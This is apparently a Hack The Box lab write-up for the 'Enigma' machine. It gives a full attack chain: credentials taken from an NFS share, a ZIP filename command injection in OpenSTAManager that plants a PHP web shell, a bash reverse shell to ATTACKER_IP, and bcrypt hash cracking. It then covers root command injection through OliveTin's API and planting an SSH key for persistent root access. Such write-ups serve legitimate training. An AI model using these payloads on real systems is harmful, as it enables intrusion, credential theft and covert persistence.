# Enigma

<details>
<summary>Machine Info</summary>

- **OS:** Linux
- **Difficulty:** Medium
- **Category:** Full Chain (Web → NFS → Mail → RCE → Privesc)
- **Skills:** NFS Enumeration, ZIP Command Injection, OpenSTAManager Exploitation, BCrypt Cracking, OliveTin API Abuse
- **Authorized Pentest:** ✅ Explicit authorization granted via HTB terms

</details>

---

## Table of Contents

1. [Reconnaissance & Service Enumeration](#1-reconnaissance--service-enumeration)
2. [NFS Share & Credential Discovery](#2-nfs-share--credential-discovery)
3. [Webmail & Further Credentials](#3-webmail--further-credentials)
4. [OpenSTAManager – File Upload Exploit](#4-openstamanager--file-upload-exploit)
5. [Reverse Shell as www-data](#5-reverse-shell-as-www-data)
6. [Database Enumeration & Password Cracking](#6-database-enumeration--password-cracking)
7. [Switch to User haris & Get User Flag](#7-switch-to-user-haris--get-user-flag)
8. [Privilege Escalation – OliveTin API Command Injection](#8-privilege-escalation--olivetin-api-command-injection)
9. [Optional – Persistent Root SSH](#9-optional--persistent-root-ssh)
10. [Flags](#10-flags)

---

## 1. Reconnaissance & Service Enumeration

### Nmap Scan

```bash
nmap -sC -sV -p- -T4 -oN nmap_full.txt TARGET_IP
```

**Open Ports (relevant):**

| Port   | Service | Version / Detail                        |
|--------|---------|-----------------------------------------|
| 22/tcp | SSH     | OpenSSH 9.6p1                           |
| 80/tcp | HTTP    | nginx 1.24.0 (vhost: `enigma.htb`)      |
| 110/tcp| POP3    | Dovecot                                 |
| 143/tcp| IMAP    | Dovecot                                 |
| 2049/tcp| NFS    | RPC-based file share                    |
| 993/tcp| IMAPS   | Dovecot SSL                             |
| 995/tcp| POP3S   | Dovecot SSL                             |
| Various| RPC     | mountd, nlockmgr, status                |

### Add Virtual Hosts

Add discovered virtual hosts to `/etc/hosts`:

```bash
echo "TARGET_IP enigma.htb mail001.enigma.htb support_001.enigma.htb" | sudo tee -a /etc/hosts
```

---

## 2. NFS Share & Credential Discovery

### Mount the NFS Share

List available exports:

```bash
showmount -e TARGET_IP
# Output: /srv/nfs/onboarding *
```

Mount the NFS share locally:

```bash
sudo mkdir -p /mnt/enigma_nfs
sudo mount -t nfs TARGET_IP:/srv/nfs/onboarding /mnt/enigma_nfs -o nolock
```

### Extract Credentials from PDF

```bash
pdftotext /mnt/enigma_nfs/New_Employee_Access.pdf output.txt
cat output.txt
```

**Credentials recovered:**

| Field    | Value                        |
|----------|------------------------------|
| Webmail  | `http://mail001.enigma.htb`  |
| Username | `kevin`                      |
| Password | `Enigma2024!`                |

---

## 3. Webmail & Further Credentials

Navigate to `http://mail001.enigma.htb` and log in as `kevin:Enigma2024!`.

In the inbox, an email from **IT Support** contains:

```
URL:      http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

**Bonus – Weak Password Reuse:**  
The same password (`Enigma2024!`) also works for `sarah` – confirming a weak password policy across accounts.

---

## 4. OpenSTAManager – File Upload Exploit

### Identify the Vulnerable Endpoint

The support portal at `support_001.enigma.htb` runs **OpenSTAManager**.  
Log in as `admin:Ne3s4rtars78s`.

The module at `?id_module=14#tab_48` exposes a **ZIP file upload feature**.  
The application unsafely extracts the ZIP, and the filename is passed directly to a shell command – allowing **command injection**.

### Create the Malicious ZIP

Save the following as `create_evil.py`:

```python
import zipfile, io

payload = '1.p7m";cd files;echo \'<?php system($_GET[0]);?>\'>s.php;echo "1.p7m'
zip_buffer = io.BytesIO()

with zipfile.ZipFile(zip_buffer, 'w') as z:
    z.writestr(payload, 'AAAA')

with open('evil.zip', 'wb') as f:
    f.write(zip_buffer.getvalue())
```

Generate the exploit archive:

```bash
python3 create_evil.py
```

### Authenticate and Upload

```bash
# Login and capture session cookies
curl -c cookies.txt -X POST http://support_001.enigma.htb/?op=login \
  -d "username=admin&password=Ne3s4rtars78s" -L

# Upload the malicious ZIP
curl -b cookies.txt -X POST http://support_001.enigma.htb/actions.php \
  -F "op=save" -F "id_module=14" -F "id_plugin=48" -F "blob1=@evil.zip"
```

> **Note:** A `500 Internal Server Error` is expected – the injection still succeeds. The error originates from XML parsing after the payload executes.

### Verify Remote Code Execution

```bash
curl "http://support_001.enigma.htb/files/s.php?0=id"
```

**Expected output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 5. Reverse Shell as www-data

### Set Up Listener (Kali)

```bash
nc -lvnp 4444
```

### Trigger the Reverse Shell

```bash
curl -G "http://support_001.enigma.htb/files/s.php" \
  --data-urlencode "0=python3 -c 'import subprocess; subprocess.Popen([\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"])'"
```

### Stabilize the TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z to background the shell, then on Kali:
stty raw -echo; fg
# Press Enter twice
```

---

## 6. Database Enumeration & Password Cracking

### Locate Database Credentials

```bash
cat /var/www/html/openstamanager/config.inc.php
```

| Field      | Value               |
|------------|---------------------|
| DB User    | `brollin`           |
| DB Password| `Fri3nds@9099`      |
| DB Name    | `openstamanager`    |

### Dump Password Hashes

```bash
mysql -u brollin -pFri3nds@9099 -h localhost openstamanager \
  -B -e "SELECT username, password FROM zz_users;"
```

**Output:**

| Username | Password Hash                                                                     |
|----------|-----------------------------------------------------------------------------------|
| `admin`  | `$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu`                  |
| `haris`  | `$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC`                  |

### Crack the bcrypt Hash with Hashcat

Copy the `haris` hash into a file `hashes.txt` on your Kali machine, then run:

```bash
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Cracked password:**

| Username | Hash                                                                 | Plaintext      |
|----------|----------------------------------------------------------------------|----------------|
| `haris`  | `$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC`     | `bestfriends`  |

---

## 7. Switch to User haris & Get User Flag

From the stabilized `www-data` shell:

```bash
su haris
Password: bestfriends
```

Confirm identity:

```bash
id
# uid=1001(haris) gid=1001(haris) groups=1001(haris)
```

Read the user flag:

```bash
cat /home/haris/user.txt
```

> **User Flag:** `[32-character hex string]`

---

## 8. Privilege Escalation – OliveTin API Command Injection

### Discover the OliveTin Service

```bash
ss -tlnp
```

Port **1337** is listening locally. Identify the process:

```bash
ps aux | grep 1337
```

Result: `/usr/local/bin/OliveTin` running as **root**.

### Enumerate API Actions

```bash
curl http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/ListActions
```

Among the actions, `backup_database` accepts three parameters:  
`db_user`, `db_pass`, `db_name`.

### Test Command Injection

The action likely executes something like:

```bash
mysqldump -u <db_user> -p'<db_pass>' <db_name>
```

By injecting a semicolon within the password value, we can execute arbitrary commands as **root**.

```bash
curl -s -X POST \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -d '{"actionId":"backup_database","arguments":[
    {"name":"db_user","value":"backup_svc"},
    {"name":"db_pass","value":"x'\'' ; id ; #"},
    {"name":"db_name","value":"production"}
  ]}'
```

**Expected output snippet:** `uid=0(root)` – confirming command injection as root.

### Extract the Root Flag

```bash
curl -s -X POST \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -d '{"actionId":"backup_database","arguments":[
    {"name":"db_user","value":"backup_svc"},
    {"name":"db_pass","value":"x'\'' ; cat /root/root.txt ; #"},
    {"name":"db_name","value":"production"}
  ]}'
```

> **Root Flag:** `[32-character hex string]`

---

## 9. Optional – Persistent Root SSH

Add your SSH public key to the root account for persistent access:

```bash
curl -s -X POST \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -d '{"actionId":"backup_database","arguments":[
    {"name":"db_user","value":"backup_svc"},
    {"name":"db_pass","value":"x'\'' ; mkdir -p /root/.ssh && echo \"your_pub_key\" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys ; #"},
    {"name":"db_name","value":"production"}
  ]}'
```

Then SSH in as root:

```bash
ssh -i ~/.ssh/your_priv_key root@TARGET_IP
```

---

## 10. Flags

| Flag      | Location               | Value                    |
|-----------|------------------------|--------------------------|
| **User**  | `/home/haris/user.txt` | `[32-character hex]`     |
| **Root**  | `/root/root.txt`       | `[32-character hex]`     |

---

## Key Tools Used

| Tool         | Purpose                                  |
|--------------|------------------------------------------|
| `nmap`       | Port & service enumeration               |
| `showmount`  | NFS export discovery                     |
| `pdftotext`  | PDF to text extraction                   |
| `curl`       | HTTP requests, uploads, API calls        |
| `hashcat`    | bcrypt password cracking (mode 3200)     |
| `mysql`      | Database query and hash extraction       |
| `netcat`     | Reverse shell listener                   |
| `ss` / `ps`  | Local port & process enumeration         |
